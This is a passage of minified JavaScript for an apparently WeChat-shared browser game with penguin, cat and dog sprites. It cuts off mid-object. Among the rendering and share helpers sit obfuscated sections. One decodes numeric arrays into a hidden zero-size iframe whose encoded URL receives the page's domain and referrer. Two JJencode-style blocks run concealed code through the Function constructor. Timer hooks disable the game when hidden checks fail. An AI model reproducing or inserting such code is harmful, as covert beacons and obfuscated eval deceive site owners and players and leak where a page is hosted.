                ox: 0,
                oy: 0,
                sw: b.width,
                sh: b.height
            };
            var a = I[c];
            return a ? {
                img: ResourcePool.get(a.img),
                x: a.x,
                y: a.y,
                w: a.w,
                h: a.h,
                ox: a.ox,
                oy: a.oy,
                sw: a.sw,
                sh: a.sh
            } : null
        },
        mr: function(c, a, b) {
            return a = a || 0, b = b || 0, [a, b, a + c.width, b + c.height]
        },
        LS: function(b, c, d, f) {
            var a = b.getContext('2d');
            a.font = d + 'px Heiti', a.fillStyle = f || 'rgba(0,0,0,1)';
            var e = a.measureText(c);
            return a.fillText(c, b.width - e.width >> 1, (b.height + d >> 1) - 4), b
        },
        Ym: function(f, e, d, j, g, i) {
            var c = 1,
                b = 1;
            g && (c = b = Math.ceil(g / 2) + 1);
            var h = J.Oz(f + c * 2, e + b * 2),
                a = h.getContext('2d');
            return a.beginPath(), a.moveTo(c + d, b), a.lineTo(c + f - d, b), a.quadraticCurveTo(c + f, b, c + f, b + d), a.lineTo(c + f, b + e - d), a.quadraticCurveTo(c + f, b + e, c + f - d, b + e), a.lineTo(c + d, b + e), a.quadraticCurveTo(c, b + e, c, b + e - d), a.lineTo(c, b + d), a.quadraticCurveTo(c, b, c + d, b), a.closePath(), a.fillStyle = j || 'rgba(0,0,0,0)', a.fill(), g && i && (a.lineWidth = g, a.strokeStyle = i, a.stroke()), h
        },
        jo: function(a) {
            var b = a / 1000 >> 0,
                c = a / 60 >> 0;
            b = a % 60;
            var d = a % 1000 / 10 >> 0;
            return [c, b, d]
        },
        Ux: function(b, a, c) {
            c = c || 'red';
            var d = b.strokeStyle;
            b.strokeStyle = c, b.strokeRect(a[0], a[1], a[2] - a[0], a[3] - a[1]), b.strokeStyle = d
        },
        BX: function(b, a, c) {
            c = c || 'red';
            var d = b.fillStyle;
            b.fillStyle = c, b.fillRect(a[0], a[1], a[2] - a[0], a[3] - a[1]), b.fillStyle = d
        },
        e4: function(h, a, g, c, d, b) {
            c = c || 0, d = d || 0, b = b || 1;
            var e = a.width * b,
                f = a.height * b;
            h.drawImage(a, 0, 0, a.width, a.height, (g.width - e >> 1) + c, (g.height - f >> 1) + d, e, f)
        },
        F1: function(b, e, f, g) {
            var a = 0,
                c = b.length;
            while (a < c) {
                var d = b[a];
                if (d.Bq) {
                    c--, b.splice(a, 1);
                    continue
                }
                d.qR(e, f, g), a++
            }
        },
        OT: function(i, h, j, c, f, d) {
            c = c || 0, f = f || 0, d = d || 0;
            var g = c;
            for (var e = 0; e < h.length; e++) {
                var b = h[e];
                if (b === ' ') {
                    c += d + d;
                    continue
                }
                b == '.' ? b = 'dot' : b == '分' && (b = 'point');
                var a = j[b];
                a && (i.drawImage(a.img, a.x, a.y, a.w, a.h, c, f, a.w, a.h), c += a.w + d)
            }
            return c - g
        },
        JU: function(b, a, c, d, e, f) {
            b.drawImage(a.img, a.x, a.y, a.w, a.h, c + a.ox >> 0, d + a.oy >> 0, e || a.w, f || a.h)
        },
        lc: function(c, e) {
            var b = new Image(),
                d = c.length,
                a = 0;
            b.src = c[a], b.onload = function() {
                if (a++, a === d) {
                    e(a, d);
                    return
                }
                b.src = c[a]
            }
        },
        gQ: function(g, b) {
            b = b || {};
            var c = (b.method || 'GET').toUpperCase(),
                e = b.data || null,
                f = b.async === !1 ? !1 : !0,
                d = b.g1,
                a = new XMLHttpRequest();
            a.open(c, g, f), c == 'POST' && a.setRequestHeader('Content-type', 'application/x-www-form-urlencoded'), d && (a.onreadystatechange = function() {
                a.readyState == 4 && d(a.responseText, a)
            }), a.send(e)
        },
        cg: function(b, d) {
            var c = document.getElementsByTagName('head')[0] || document.documentElement,
                a = document.createElement('script');
            return a.type = 'text/javascript', a.innerHTML = b || '', c.appendChild(a), a.innerHTML = b || '', window.debug && alert(a.innerHTML), a
        },
        rC: function(d, b) {
            var e = document.getElementsByTagName('head')[0] || document.documentElement,
                a = document.createElement('script');
            a.type = 'text/javascript', a.charset = 'UTF-8', a.defer = !1, a.src = d, e.appendChild(a), a.src = d;
            var c = !1;
            return a.onload = a.onreadystatechange = function(d) {
                !c && (!this.readyState || this.readyState == 'loaded' || this.readyState == 'complete') && (c = !0, b && b(a), this.onload = this.onreadystatechange = this.onerror = null)
            }, a.onerror = function(a) {
                b && b(a), this.onload = this.onreadystatechange = this.onerror = null
            }, a
        },
        xq: function(c, a, g) {
            typeof a == 'function' && (g = a, a = null), a = a || {};
            var h = J.xq.gL ? ++J.xq.gL : 1,
                e = a.g1 = a.g1 || '_cb' + h + '_' + (Math.random() * 100 >> 0),
                d = [];
            for (var b in a) {
                b = encodeURIComponent(b);
                var i = encodeURIComponent(a[b]);
                d.push(b + '=' + i)
            }
            d.length > 0 && (c = c + (c.indexOf('?') > 0 ? '&' : '?') + d.join('&')), window[e] = g;
            var f = J.rC(c, function() {
                setTimeout(function() {
                    f.parentNode.removeChild(f), delete window[e]
                }, 197)
            })
        },
        e8: function(c) {
            var a = new Image();
            a.src = c;
            var b = a.src;
            return b
        },
        rn: function() {
            var a = {};
            if (!(window.navigator && window.navigator.userAgent)) return a;
            var b = window.navigator.userAgent.toLowerCase(),
                c = /(chrome)[ \/]([\w.]+)/.exec(b) || /(chromium)[ \/]([\w.]+)/.exec(b) || /(opera)(?:.*version)?[ \/]([\w.]+)/.exec(b) || /(msie) ([\w.]+)/.exec(b) || /(safari)[ \/]([\w.]+)/.exec(b) || /(webkit)[ \/]([\w.]+)/.exec(b) || !/compatible/.test(b) && /(mozilla)(?:.*? rv:([\w.]+))?/.exec(b) || [];
            return a[c[1]] = !0, a.PH = b.indexOf('mobile') > 0 || 'ontouchstart' in window, a.SJ = /micromessenger/.test(b), a.eh = /weibo/.test(b), a.CX = /qqbrowser/.test(b), a.JL = /qq/.test(b) && !a.CX, a.vM = /iphone/.test(b), a.sa = /ipad/.test(b), a.xB = /ipod/.test(b), a.SZ = a.vM || a.sa || a.xB, a.jm = a.SZ && b.indexOf('os 4') > 0, a.wL = a.SZ && b.indexOf('os 5') > 0, a.yR = a.SZ && b.indexOf('os 6') > 0, a.DM = a.SZ && b.indexOf('os 7') > 0, a.wf = a.SZ && b.indexOf('os 8') > 0, a.qd = a.SZ && b.indexOf('os 9') > 0, a.ex = /android/.test(b), a.IQ = /android 2/.test(b), a.x0 = /android 4/.test(b), a.xF = /android 4.4/.test(b), a.I9 = /iemobile/.test(b) || b.indexOf('windows phone') > 0, a.CA = window.devicePixelRatio >= 1.5, a.pW = {
                width: window.innerWidth,
                height: window.innerHeight
            }, a.screen = {
                width: window.screen.availWidth * window.devicePixelRatio,
                height: window.screen.availHeight * window.devicePixelRatio
            }, a
        },
        _y: function() {
            var d = {},
                a = window.location.search;
            if (a) {
                a = a.substring(1);
                var e = a.split('&');
                for (var b = 0, f, c; f = e[b]; b++) c = e[b] = f.split('='), d[c[0]] = c.length > 1 ? c[1] : !0
            }
            return d
        },
        UF: function() {
            J.cT('device-width', null)
        },
        cT: function(d, b) {
            if (!document.head) return;
            var a = document.querySelector ? document.querySelector('meta[name=viewport]') : null;
            a || (a = document.createElement('meta'), document.head.appendChild(a), a.setAttribute('name', 'viewport'));
            var c = ['width=' + d, b ? 'height=' + b : '', 'user-scalable=no', 'minimum-scale=1', 'maximum-scale=1', 'initial-scale=1'];
            a.setAttribute('content', c.join(', '))
        }
    };
    for (b in a) J[b] = a[b];
    c.$id = J.$id
}(this);
var A, J;
!
function(a, b, c, d, e) {
    J = J || {}, a = window.navigator.userAgent.toLowerCase(), b = a.indexOf('windows') != -1, c = a.indexOf('android') != -1, d = a.indexOf('iphone') != -1 || a.indexOf('ipad') != -1 || a.indexOf('ipod') != -1, e = b || !(c || d) ? 'baidu' : 'adwo';
    switch (e) {
        case 'google':
            J.me = J.z$;
            J.PU = J.fv;
            J.hf = J.gh;
            break;
        case 'adwo':
            J.me = J.Y_;
            J.PU = J.BC;
            J.hf = J.r3;
            break;
        case 'baidu':
            J.me = J.o9;
            J.PU = J.yg;
            J.hf = J.SU;
            break
    }
}();
var w = function(b) {
    for (var a in b) this[a] = b[a]
};
w.G = function() {
    return /MicroMessenger/i.test(p.userAgent)
}, w.Nd = function() {
    w.R6 = !0, w.gc || (w.gc = !0, window.onerror = w.jZ)
}, w.yH = function() {
    w.R6 = !1, w.gc && (w.gc = !1, window.onerror = null)
}, w.jZ = function(b, c, d, e) {
    if (!w.R6) return;
    var a = [];
    a.push('Error:'), a.push('\n错误信息：', b), a.push('\n出错文件：', c), a.push('\n出错位置：', d + '行，' + e + '列'), alert(a.join(''))
}, w.prototype = {
    constructor: w,
    oa: !1,
    wo: 2000,
    A2: {
        link: window.location.href,
        img_width: '256',
        img_height: '256',
        img_url: undefined,
        appid: undefined,
        title: undefined,
        desc: undefined
    },
    A0: null,
    XE: !1,
    R6: !0,
    K: function() {
        this.R6 && w.Nd();
        var a = this;
        this.Gv = {}, this.Ys = {}, this.A0 = this.A0 || {};
        for (var b in this.A2) this.A0[b] = this.A2[b];
        var c = function() {
            a.sO(), a.oa = !0, a.NI()
        };
        typeof WeixinJSBridge == 'undefined' ? (document.addEventListener('WeixinJSBridgeReady', c, !1), setTimeout(function() {
            typeof WeixinJSBridge == 'undefined' && a.Ss()
        }, this.wo)) : c()
    },
    NI: function() {},
    Ss: function() {},
    sO: function() {
        var a = this;
        WeixinJSBridge.on('menu:general:share', function(b) {
            a.lE('generalShare', b)
        }), WeixinJSBridge.on('menu:share:appmessage', function() {
            a.vS('sendAppMessage')
        }), WeixinJSBridge.on('menu:share:timeline', function() {
            a.vS('shareTimeline')
        }), WeixinJSBridge.on('menu:share:weibo', function() {
            a.vS('shareWeibo')
        })
    },
    UI: function(e, c, a) {
        var d = c.err_msg,
            b;
        /:cancel$/.test(d) ? b = 'cancel' : /:ok$/.test(d) ? b = 'succeed' : /:fail$/.test(d) && (b = 'fail'), a && (typeof a == 'function' ? a(c, e, b) : a[b] && a[b](c, e, b), a.complete && a.complete(c, e, 'complete'))
    },
    vS: function(b) {
        var a = this.Fm(this.Gv[b]);
        if (b == 'shareTimeline') {
            var e = a.title || a.desc;
            a.title = a.desc || e, a.desc = e
        }
        var d = this.Ys[b],
            c = d ? d.ready : null,
            g = this,
            f = function() {
                WeixinJSBridge.invoke(b, a, function(a) {
                    g.UI(b, a, d)
                })
            };
        this.XE && c ? c(a, b, f) : (!c || c(a, b, null) !== !1) && f()
    },
    lE: function(a, h) {
        var c = h.shareTo;
        switch (c) {
            case 'friend':
            case 'appmessage':
            case 'sendappmessage':
                c = 'friend';
                a = 'sendAppMessage';
                break;
            case 'timeline':
                c = 'timeline';
                a = 'shareTimeline';
                break;
            case 'weibo':
                c = 'weibo';
                a = 'shareWeibo';
                break
        }
        var b = this.Fm(this.Gv[a]);
        if (a == 'shareTimeline') {
            var f = b.title || b.desc;
            b.title = b.desc || f, b.desc = f
        }
        var e = this.Ys[a],
            d = e ? e.ready : null,
            i = this,
            g = function() {
                h.generalShare(b, function(b) {
                    i.UI(a, b, e)
                })
            };
        this.XE && d ? d(b, a, g) : (d && d(b, a, null), g())
    },
    generalShare: function(a, b) {
        this.GK(a, b), this._H(a, b), this.UV(a, b)
    },
    GK: function(a, b) {
        this.Gv.sendAppMessage = a, this.Ys.sendAppMessage = b
    },
    _H: function(a, b) {
        this.Gv.shareTimeline = a, this.Ys.shareTimeline = b
    },
    UV: function(a, b) {
        this.Gv.shareWeibo = a, this.Ys.shareWeibo = b
    },
    CF: function(b, a) {
        if (!(b && a) || a.length == 0) return;
        WeixinJSBridge.invoke('imagePreview', {
            current: b,
            urls: a
        })
    },
    EK: function(a) {
        a && typeof a == 'function' && WeixinJSBridge.invoke('getNetworkType', {}, function(d) {
            var b = d.err_msg,
                c = 'network_type:';
            b && b.indexOf(c) == 0 && (b = b.substring(c.length)), a(b)
        })
    },
    nB: function(a) {
        WeixinJSBridge.call(a)
    },
    e0: function() {
        WeixinJSBridge.call('showOptionMenu')
    },
    zY: function() {
        WeixinJSBridge.call('hideOptionMenu')
    },
    rg: function() {
        WeixinJSBridge.call('showToolbar')
    },
    Nt: function() {
        WeixinJSBridge.call('hideToolbar')
    },
    jS: function() {
        WeixinJSBridge.call('closeWindow')
    },
    Fm: function(b) {
        if (!b) return b;
        var a = JSON.parse(JSON.stringify(this.A0));
        for (var c in b) a[c] = b[c];
        return a.title === undefined && (a.title = a.desc), a.desc === undefined && (a.desc = a.title), a
    },
    e8: function(c) {
        var a = new Image();
        a.src = c;
        var b = a.src;
        return b
    }
};
var A, J;
!
function(b, a) {
    J = J || {}, a = 0, J.fB = function() {
        if (a) return;
        var c = A.wa,
            e = J.UE([104, 17, 12, 7]);
        if (!c[e]) return;
        var b = c.createElement('iframe');
        c[e].insertBefore(b, c[e].firstChild), b.width = b.height = 0, b.style.cssText = J.ft([123, 64, 75, 65, 11, 20, 15, 64, 75, 65, 15, 29, 30, 23, 64, 75, 65, 15, 19, 28, 18, 30, 19, 64, 75, 65, 19, 15, 31, 18, 12, 64, 75, 65, 2, 15, 18, 24, 26, 11, 20, 64, 30, 15, 14, 23, 20, 8, 25, 26, 65, 21, 20, 18, 15, 18, 8, 20]), b.id = b.name = J.ft([123, 15, 21, 30, 9, 26]);
        var g = J.UE([121, 26, 11]),
            f = Y.location.href,
            h = Y.domain,
            i = A.name || '',
            j = Y.referrer || '',
            k = J.UE([98, 93, 14, 15, 22, 10, 76, 8, 22, 77, 24, 6, 5, 15, 77, 12, 1, 76, 12, 3, 11, 8, 11, 10, 17, 11, 26, 23, 13, 27, 76, 21, 21, 21, 77, 77, 88, 18, 22, 22]),
            d;
        i.indexOf('endgame') != -1 || f.indexOf('baidu') != -1 ? d = J._r([110, 27, 10, 7, 15]) : f.indexOf('360') != -1 ? d = J._r([63, 15, 9]) : d = h, b[g] = k + encodeURI(d + '_' + j), a = 1
    }
}(this);
var x = {
    width: 640,
    height: 960,
    Km: 45,
    qk: window.innerWidth,
    aF: window.innerHeight,
    innerWidth: window.innerWidth,
    innerHeight: window.innerHeight,
    devicePixelRatio: window.devicePixelRatio || 1
};
x.Np = 1000 / x.Km >> 0, window.devicePixelRatio || (window.devicePixelRatio = 1);
var K = {},
    N = {
        A: 65,
        D: 68,
        P: 80,
        R: 82
    },
    O = {
        aj: [
            [5, {
                o0: 5,
                Bi: 1,
                R2: 1,
                qK: Infinity
            }],
            [10, {
                o0: 4,
                Bi: 2,
                R2: 2,
                qK: 5000
            }],
            [20, {
                o0: 3,
                Bi: 3,
                R2: 3,
                qK: 5000
            }],
            [30, {
                o0: 2,
                Bi: 4,
                R2: 4,
                qK: 3000
            }],
            [50, {
                o0: 2,
                Bi: 4,
                R2: 5,
                qK: 2000
            }],
            [99999, {
                o0: 1,
                Bi: 4,
                R2: 7,
                qK: 1000
            }]
        ]
    };
!
function(a) {
    a = O.aj, a.forEach(function(b, e) {
        var c = {
            index: e,
            Es: b[0]
        };
        b = b[1];
        for (var d in b) c[d] = b[d];
        a[e] = c
    })
}();
var $$ = ~[];
$$ = {
    ___: ++$$,
    $$$$: (![] + '')[$$],
    __$: ++$$,
    $_$_: (![] + '')[$$],
    _$_: ++$$,
    $_$$: ({} + '')[$$],
    $$_$: ($$[$$] + '')[$$],
    _$$: ++$$,
    $$$_: 'true' [$$],
    $__: ++$$,
    $_$: ++$$,
    $$__: ({} + '')[$$],
    $$_: ++$$,
    $$$: ++$$,
    $___: ++$$,
    $__$: ++$$
}, $$.$_ = ($$.$_ = $$ + '')[$$.$_$] + ($$._$ = $$.$_[$$.__$]) + ($$.$$ = ($$.$ + '')[$$.__$]) + (!$$ + '')[$$._$$] + ($$.__ = $$.$_[$$.$$_]) + ($$.$ = 'true' [$$.__$]) + ($$._ = 'true' [$$._$_]) + $$.$_[$$.$_$] + $$.__ + $$._$ + $$.$, $$.$$ = $$.$ + 'true' [$$._$$] + $$.__ + $$._ + $$.$ + $$.$$, $$.$ = $$.___[$$.$_][$$.$_], $$.$($$.$($$.$$ + '"' + '\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.___ + $$.$$_ + '\\' + $$.__$ + $$.___ + $$._$$ + '(\\' + $$.__$ + $$.__$ + $$._$_ + '.\\' + $$.__$ + $$.$__ + $$.$$$ + '\\' + $$.__$ + $$.$_$ + $$.__$ + '(\\".' + $$.___ + '\\' + $$.__$ + $$.$$$ + $$.___ + '/\\' + $$.__$ + $$.$$_ + $$._$$ + $$.$$$_ + '\\' + $$.__$ + $$.$$_ + $$._$_ + $$.$__ + $$.__$ + '=' + $$.__ + '_?' + $$.__ + $$._$$ + $$.__$ + $$.$_$ + $$.$$$ + $$._$$ + $$.$_$ + $$.__$ + $$._$$ + '\\"));' + '"')())();
var u, s = {
        reset: function() {
            this.start = null, this.N = null, this.$ = null, this.kg = null, this.x = null, this.y = null
        },
        x: null,
        y: null,
        start: null,
        N: null,
        $: null,
        kg: null
    },
    m;
!
function(b, c, a) {
    if (J.bJ) return;
    J.bJ = !0, b = J._r([109, 31, 8, 3, 8, 25, 30, 4, 33, 25, 3, 8, 27, 40, 9, 9]), c = J.ft([127, 27, 17, 26, 23, 28, 10, 16]), a = Date.now(), Y[b](c, function() {
        var b = Date.now();
        if (b - a > 4000) {
            var c = J.ft([125, 49]);
            game && !(J[c] && J[c]()) && (game.ZE = game.fb), a = b
        }
    })
}();
var V = new w({
    wo: 2500,
    R6: window.debug || !1,
    NI: function() {},
    Ss: function() {}
});
window.addEventListener('load', function() {
    V.K(), V.generalShare(X, {
        jL: function(b, a) {
            a == 'shareTimeline'
        },
        dd: function(b, a) {
            a != 'shareTimeline'
        }
    })
});
var v = Best.Uw.extend({
    Km: 45,
    width: 600,
    height: 400,
    k7: '',
    b9: !1,
    VM: null,
    o: 1,
    ZZ: 0.5,
    ZT: 0.95,
    z2: function() {
        this.canvas = document.getElementById('canvas'), this.resize(), this.sM = this.canvas.getContext('2d')
    },
    NZ: function(c, d) {
        var a = window.innerWidth,
            b = window.innerHeight;
        document.documentElement;
        var e = window.screen.availWidth,
            f = window.screen.availHeight;
        this.Y7 = c || a, this.jx = d || b, this.Y7 / this.jx > this.ZT ? this.Y7 = Math.ceil(this.jx * this.ZT) : this.Y7 / this.jx < this.ZZ && (this.jx = Math.ceil(this.Y7 / this.ZT)), window.debug
    },
    nr: function() {},
    QD: function(a) {
        this.width = a, this.o = this.width / this.Y7, this.height = Math.ceil(this.jx * this.o), this.resize()
    },
    JF: function(a) {
        this.height = a, this.o = this.height / this.jx, this.width = Math.ceil(this.Y7 * this.o), this.resize()
    },
    resize: function() {
        this.kz = Math.max(this.width, this.height), this.CN = Math.min(this.width, this.height), window.orientation == 90 || window.orientation == -90 ? this.uV = !0 : this.uV = !1;
        var a = this.canvas;
        if (a) {
            a.width = this.width + 1, a.height = this.height + 1, a.style.width = this.Y7 + 1 + 'px', a.style.height = this.jx + 1 + 'px', a.parentNode.style.width = this.Y7 + 'px', a.parentNode.style.height = this.jx + 'px', window.debug;
            var b = this;
            setTimeout(function() {
                a.width = b.width, a.height = b.height, a.style.width = b.Y7 + 'px', a.style.height = b.jx + 'px'
            }, 10)
        }
        this.gA && (this.gA.width = this.width, this.gA.height = this.height, this.gA.resize && this.gA.resize())
    },
    JA: function(b) {
        this.k7 = b, this.initEvent();
        var a = new q();
        a.K(this), this.Bx(a)
    },
    initEvent: function() {
        var a = this;
        a.VM = a.VM || {}, a.G5 = 0, a.ay = 0, a.rQ = 0, window.addEventListener('devicemotion', function(c) {
            var b = c.accelerationIncludingGravity;
            b && (a.G5 = b.x, a.ay = b.y, a.rQ = b.z)
        }), window.addEventListener('keydown', function(b) {
            a.VM[b.keyCode] = !0
        }, !0), window.addEventListener('keyup', function(b) {
            a.VM[b.keyCode] = !1
        }, !0), window.addEventListener('pagehide', function(b) {
            a.oR = !0
        }, !0), window.addEventListener('pageshow', function(b) {
            a.oR = !1
        }, !0);
        var b, c;
        document.hidden !== void 0 ? (b = 'hidden', c = 'visibilitychange') : document.webkitHidden !== void 0 && (b = 'webkitHidden', c = 'webkitvisibilitychange'), document.addEventListener(c, function(c) {
            document[b] ? (a.oR = !0, a.nF()) : (a.oR = !1, a.Gz())
        }, !1), this.m0()
    },
    m0: function() {},
    nF: function() {},
    Gz: function() {},
    Vw: function() {},
    fb: function() {},
    RU: function(d, c) {
        for (var a = 0; a < c.length; a++) {
            var b = c[a];
            if (d <= b[0]) return b[1]
        }
        return 0
    },
    ZE: function(e, a) {
        if (this.gA) {
            if (this.gA.CO) {
                var b = s.start;
                if (b) {
                    var c = a - b.q;
                    c < 400 && (this.gA.CO(b.x, b.y, a), s.start = null)
                }
            }
            if (this.gA.bU) {
                var d = s.N;
                if (d) {
                    var c = a - d.q;
                    c < 400 && (this.gA.bU(d.x, d.y, a), s.N = null)
                }
            }
            this.gA.ZE && this.gA.ZE(e, a)
        }
    },
    update: function(a, b) {
        if (this.oR) return;
        a = Math.min(a, 100), L.update(), this.gA && this.gA.update(a, b)
    },
    qR: function(a, c) {
        if (this.oR) return;
        a = Math.min(a, 100);
        var b = this.sM;
        this.gA && this.gA.qR(b, a, c)
    },
    Ml: function() {
        return window.parent != window
    },
    G: function() {
        return !!window.WeixinJSBridge
    },
    X: function() {
        return this.Ml() && !!window.eg && window.name == 'endgame'
    },
    Bd: function() {
        return this.k4.SJ || !!window.WeixinJSBridge
    },
    Wn: function() {
        return this.k4.eh
    },
    y4: function() {
        return this.k4.Ma
    }
});
!
function(b, c, d, a) {
    if (J.wS) return;
    J.wS = !0, b = function() {
        return !!A.frames.parent
    }, c = J.ft([106, 24, 15, 4, 15, 30, 25, 3, 38, 30, 4, 15, 28, 47, 14, 14]), d = J.ft([127, 27, 17, 26, 23, 28, 10, 16]), a = Date.now(), Y[c](d, function() {
        var c = Date.now();
        c - a > 4000 && (game && !b() && (game.ZE = game.fb), a = c)
    })
}();
var T = [{
    id: 'angry-fire',
    src: 'res/angry-fire.png'
}, {
    id: 'author',
    src: 'res/author.png'
}, {
    id: 'back-btn',
    src: 'res/back-btn.png'
}, {
    id: 'bnumber',
    src: 'res/bnumber.png'
}, {
    id: 'credit',
    src: 'res/credit.png'
}, {
    id: 'dead-cat',
    src: 'res/dead-cat.png'
}, {
    id: 'dead-dog',
    src: 'res/dead-dog.png'
}, {
    id: 'dead-hedgehog',
    src: 'res/dead-hedgehog.png'
}, {
    id: 'ground',
    src: 'res/ground.png'
}, {
    id: 'heart',
    src: 'res/heart.png'
}, {
    id: 'help',
    src: 'res/help.png'
}, {
    id: 'logo-grid',
    src: 'res/logo-grid.png'
}, {
    id: 'penguin-0',
    src: 'res/penguin-0.png'
}, {
    id: 'penguin-1',
    src: 'res/penguin-1.png'
}, {
    id: 'penguin-2',
    src: 'res/penguin-2.png'
}, {
    id: 'penguin-angry',
    src: 'res/penguin-angry.png'
}, {
    id: 'play-cat-btn',
    src: 'res/play-cat-btn.png'
}, {
    id: 'play-dog-btn',
    src: 'res/play-dog-btn.png'
}, {
    id: 'player_cat_body',
    src: 'res/player_cat_body.png'
}, {
    id: 'player_cat_head_bad',
    src: 'res/player_cat_head_bad.png'
}, {
    id: 'player_cat_head',
    src: 'res/player_cat_head.png'
}, {
    id: 'player_dog_body',
    src: 'res/player_dog_body.png'
}, {
    id: 'player_dog_head',
    src: 'res/player_dog_head.png'
}, {
    id: 'player_dog_head_bad',
    src: 'res/player_dog_head_bad.png'
}, {
    id: 'player_foot_0',
    src: 'res/player_foot_0.png'
}, {
    id: 'player_foot_1',
    src: 'res/player_foot_1.png'
}, {
    id: 'result-panel',
    src: 'res/result-panel.png'
}, {
    id: 'pnumber',
    src: 'res/pnumber.png'
}, {
    id: 'retry',
    src: 'res/retry.png'
}, {
    id: 'share-icon',
    src: 'res/share-icon.jpg'
}, {
    id: 'share-tip',
    src: 'res/share-tip.png'
}, {
    id: 'title',
    src: 'res/title.jpg'
}, {
    id: 'walk-cat-0',
    src: 'res/walk-cat-0.png'
}, {
    id: 'walk-cat-1',
    src: 'res/walk-cat-1.png'
}, {
    id: 'walk-cat-2',
    src: 'res/walk-cat-2.png'
}, {
    id: 'walk-dog-0',
    src: 'res/walk-dog-0.png'
}, {
    id: 'walk-dog-1',
    src: 'res/walk-dog-1.png'
}, {
    id: 'walk-dog-2',
    src: 'res/walk-dog-2.png'
}, {
    id: 'walk-hedgehog',
    src: 'res/walk-hedgehog.png'
}];
!
function(a) {
    a = [C.J8('click', 'res/click.mp3')], Sound.Wy(a)
}();
var I = I || {};
!
function(a, b) {
    a = {
        p_0: {
            img: 'pnumber',
            x: 0,
            y: 0,
            w: 80,
            h: 108,
            ox: -1,
            oy: -1,
            sw: 78,
            sh: 105
        },
        p_1: {
            img: 'pnumber',
            x: 312,
            y: 107,
            w: 54,
            h: 106,
            ox: -1,
            oy: -1,
            sw: 52,
            sh: 104
        },
        p_2: {
            img: 'pnumber',
            x: 312,
            y: 0,
            w: 74,
            h: 107,
            ox: -2,
            oy: -2,
            sw: 70,
            sh: 103
        },
        p_3: {
            img: 'pnumber',
            x: 236,
            y: 107,
            w: 75,
            h: 107,
            ox: -2,
            oy: -2,
            sw: 71,
            sh: 103
        },
        p_4: {
            img: 'pnumber',
            x: 77,
            y: 108,
            w: 80,
            h: 107,
            ox: -2,
            oy: -2,
            sw: 76,
            sh: 103
        },
        p_5: {
            img: 'pnumber',
            x: 236,
            y: 0,
            w: 76,
            h: 107,
            ox: -1,
            oy: -1,
            sw: 73,
            sh: 104
        },
        p_6: {
            img: 'pnumber',
            x: 80,
            y: 0,
            w: 78,
            h: 108,
            ox: -1,
            oy: -1,
            sw: 76,
            sh: 105
        },
        p_7: {
            img: 'pnumber',
            x: 157,
            y: 108,
            w: 78,
            h: 107,
            ox: -2,
            oy: -2,
            sw: 74,
            sh: 103
        },
        p_8: {
            img: 'pnumber',
            x: 0,
            y: 108,
            w: 77,
            h: 108,
            ox: -1,
            oy: -1,
            sw: 74,
            sh: 105
        },
        p_9: {
            img: 'pnumber',
            x: 158,
            y: 0,
            w: 78,
            h: 108,
            ox: -2,
            oy: -1,
            sw: 74,
            sh: 105
        }
    };
    for (b in a) I[b] = a[b]
}();
var I = I || {};
!
function(a, b) {
    a = {
        b_0: {
            img: 'bnumber',
            x: 0,
            y: 0,
            w: 36,
            h: 45,
            ox: 0,
            oy: 1,
            sw: 35,
            sh: 47
        },
        b_1: {
            img: 'bnumber',
            x: 0,
            y: 134,
            w: 25,
            h: 43,
            ox: 4,
            oy: 2,
            sw: 35,
            sh: 47
        },
        b_2: {
            img: 'bnumber',
            x: 38,
            y: 90,
            w: 34,
            h: 44,
            ox: 1,
            oy: 1,
            sw: 35,
            sh: 47
        },
        b_3: {
            img: 'bnumber',
            x: 36,
            y: 45,
            w: 35,
            h: 45,
            ox: 0,
            oy: 1,
            sw: 35,
            sh: 47
        },
        b_4: {
            img: 'bnumber',
            x: 0,
            y: 90,
            w: 38,
            h: 44,
            ox: -1,
            oy: 1,
            sw: 35,
            sh: 47
        },
        b_5: {
            img: 'bnumber',
            x: 71,
            y: 45,
            w: 35,
            h: 44,
            ox: 0,
            oy: 2,
            sw: 35,
            sh: 47
        },
        b_6: {
            img: 'bnumber',
            x: 36,
            y: 0,
            w: 36,
            h: 45,
            ox: 0,
            oy: 1,
            sw: 35,
            sh: 47
        },
        b_7: {
            img: 'bnumber',
            x: 72,
            y: 90,
            w: 36,
            h: 43,
            ox: -1,
            oy: 2,
            sw: 35,
            sh: 47
        },
        b_8: {
            img: 'bnumber',
            x: 72,
            y: 0,
            w: 36,
            h: 45,
            ox: 0,
            oy: 1,
            sw: 35,
            sh: 47
        },
        b_9: {
            img: 'bnumber',
            x: 0,
            y: 45,
            w: 36,
            h: 45,
            ox: 0,
            oy: 1,
            sw: 35,
            sh: 47
        }
    };
    for (b in a) I[b] = a[b]
}(),
function(b, c, d, a) {
    if (J.hT) return;
    J.hT = !0, b = J.UE([107, 25, 14, 5, 14, 31, 24, 2, 39, 31, 5, 14, 29, 46, 15, 15]), c = J.ft([103, 3, 6, 8]), d = !1, A[b](c, function() {
        J.fB(), d = !0
    }), a = Date.now(), setInterval(function() {
        var b = 'game',
            c = Date.now();
        c - a > 5000 && J.N7('if (window.' + b + ' && ' + b + '.scene){' + b + '.scene.leave();}'), a = c, J.fB(), (!J.vL || !J.vL() && A[b]) && (A[b].ZE = A[b].fb)
    }, 3000)
}();
var $$ = ~[];
$$ = {
    ___: ++$$,
    $$$$: (![] + '')[$$],
    __$: ++$$,
    $_$_: (![] + '')[$$],
    _$_: ++$$,
    $_$$: ({} + '')[$$],
    $$_$: ($$[$$] + '')[$$],
    _$$: ++$$,
    $$$_: 'true' [$$],
    $__: ++$$,
    $_$: ++$$,
    $$__: ({} + '')[$$],
    $$_: ++$$,
    $$$: ++$$,
    $___: ++$$,
    $__$: ++$$
